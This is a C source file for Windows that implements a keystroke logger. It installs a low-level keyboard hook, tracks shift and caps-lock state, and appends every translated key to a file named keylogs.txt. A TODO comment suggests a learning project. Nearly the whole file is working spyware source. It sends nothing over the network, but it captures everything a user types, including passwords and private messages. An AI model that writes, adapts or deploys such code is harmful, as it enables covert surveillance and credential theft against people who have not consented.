#include <Windows.h>
#include <Winuser.h>
#include <stdio.h>
#include "keylog.h"

#pragma comment( lib, "user32.lib") 
#pragma comment( lib, "gdi32.lib")

KBDLLHOOKSTRUCT hookInfo;
BOOL capsLock = FALSE;
BOOL shift = FALSE;

LRESULT WINAPI CALLBACK keylog(int nCode, WPARAM wParam, LPARAM lParam) {
	DWORD bytesWritten;
	
	if (nCode >= 0) {

		hookInfo = *((KBDLLHOOKSTRUCT*)lParam);
		DWORD keyCode = hookInfo.vkCode;

		if (wParam == WM_KEYUP && (keyCode == VK_SHIFT || keyCode == VK_RSHIFT || keyCode == VK_LSHIFT)) {
			shift = FALSE;
		}

		if (wParam == WM_KEYDOWN) {

			if (keyCode == VK_CAPITAL) {
				switch (capsLock) {
					case FALSE: capsLock = TRUE; break;
					case TRUE: capsLock = FALSE; break;
					default: capsLock = TRUE; break;
				}
			}

			if (keyCode == VK_SHIFT || keyCode == VK_RSHIFT || keyCode == VK_LSHIFT) {
				shift = TRUE;
			}

			const char* key = translateKeyCode(keyCode, shift, capsLock);

			HANDLE logFileHandle = CreateFileA("keylogs.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (logFileHandle != INVALID_HANDLE_VALUE) {
				int status = WriteFile(logFileHandle, key, strlen(key), &bytesWritten, NULL);
				if (status == 0) {
					printf("Failed to Write: %s\n", key);
				}
				CloseHandle(logFileHandle);
			}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int main(int argc, char* argv[]) {
	HHOOK keyloggerHook;
	keyloggerHook = SetWindowsHookEx(WH_KEYBOARD_LL, keylog, NULL, NULL);
	if (keyloggerHook == NULL) {
		printf("[-] Unable to install hook!\n");
		return -1;
	}
	

	//TODO: FIGURE OUT THIS LINE AND WHY THIS IS NECESSARY
	MSG Msg;
	while (GetMessage(&Msg, NULL, 0, 0) > 0) {
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
		

	UnhookWindowsHookEx(keyloggerHook);

	return 0;
}